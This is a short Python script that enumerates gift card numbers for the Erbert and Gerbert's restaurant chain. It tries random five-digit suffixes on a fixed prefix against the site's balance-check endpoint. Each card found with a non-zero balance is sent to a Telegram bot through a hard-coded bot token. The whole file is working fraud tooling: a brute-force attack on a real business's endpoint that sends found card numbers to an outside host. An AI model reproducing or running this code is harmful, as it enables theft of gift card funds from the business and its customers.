import requests as re
import string
import random as ran
import os 
hc = os.environ.get("HITS")
#d = input("Enter gc")
#17805000049400
#178050000xxxxx
f = 0
i = 0
print("ERBERT AND GERBERTS GC")
while i == 0:
  rando = (''.join(ran.choices(string.digits, k = 5)))
  res = re.get("https://www.erbertandgerberts.com/wp-content/themes/erbertandgerberts/ajax/gift-card-balance.php?cardNumber=178050000" +str(rando))
  if "Error" not in res.text:
   rep = res.text.split("$")
   rep1 = rep[1].strip()
   rep3 = rep1.split("</p>")
   rep4 = rep3[0].strip()
   gcf = "★Giftcard ~ 178050000"+rando
   ama = "★Amount ~ $"+rep4
   if rep4 == "0.00":
       print("[+] CUSTOM 178050000"+rando+"   ~   $"+rep4)
       i = i
   else:
       hit = ("『ꪜ』SAYONARA 『ꪜ』\n ≈ERBERT AND GERBERTS GC HIT≈\n"+gcf+"\n"+ama)
       i = i+1
       re.get('https://api.telegram.org/bot1451863899:AAEcQAnZxYJoUmD7lpKP_9bSuD-679iC45I/sendMessage?chat_id='+hc+'&text='+hit)
       print(hit)
  else:
     print("[×]BAD 178050000"+rando)